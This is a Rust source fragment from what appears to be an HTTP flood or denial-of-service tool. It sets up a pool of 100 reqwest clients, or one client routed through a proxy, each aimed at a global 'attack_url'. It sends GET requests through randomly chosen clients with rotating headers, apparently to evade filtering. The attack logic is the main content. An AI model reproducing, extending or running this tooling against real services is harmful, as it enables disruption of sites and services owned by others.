pub(crate) fn proxy_set(vec_url: Vec<&str>, proxy: bool) -> Result<String, Error> {
    if proxy {
        if let Some(url) = vec_url.into_iter().next() {
            match reqwest::Proxy::all(url) {
                Err(e) => { return Err(e); }
                Ok(good) => {
                    let final_check = reqwest::Client::builder().proxy(good).build();
                    match final_check {
                        Err(e) => { return Err(e); }
                        Ok(final_data) => unsafe {
                            UNSAFE_PUB_VAR.client.push(request_builder(final_data));
                        },
                    }
                }
            }
        }
        unsafe { UNSAFE_PUB_VAR.proxy_mode = true; }
        Ok("Proxy has been set!".to_owned())
    } else {
        unsafe {
            for _ in 0..100 {
                UNSAFE_PUB_VAR.client.push(request_builder(reqwest::Client::new()))
            }
        }
        Ok("Set http client with no proxy successfully!".to_owned())
    }
}

pub(crate) async fn request() -> Result<Response, Error> {
    unsafe {
        let (header, header_val) = {
            let (return_header, return_header_val);
            let rng = rand::thread_rng().gen_range(0..UNSAFE_PUB_VAR.headers.len());
            if rng == 0_usize {
                let error = "error".to_owned();
                return_header = error.clone();
                return_header_val = error;
            } else {
                return_header = UNSAFE_PUB_VAR.headers[rng].clone();
                return_header_val = UNSAFE_PUB_VAR.headers_val[rng].clone();
            }
            (return_header, return_header_val)
        };
        loop {
            let rand = rand::thread_rng().gen_range(0..UNSAFE_PUB_VAR.client.len());
            if UNSAFE_PUB_VAR.client.get(rand).is_some() {
                if let Some(request) = UNSAFE_PUB_VAR.client[rand].try_clone() {
                    return handle(request, header, header_val).await;
                }
            }
        }
    }
}

async fn handle(request: RequestBuilder, header: String, val: String) -> Result<Response, Error> {
    if header == *"error" {
        request.send().await
    } else {
        request.header(header, val).send().await
    }
}

pub(crate) fn request_builder(client: reqwest::Client) -> RequestBuilder {
    unsafe {
        client.get(&UNSAFE_PUB_VAR.attack_url)
    }
}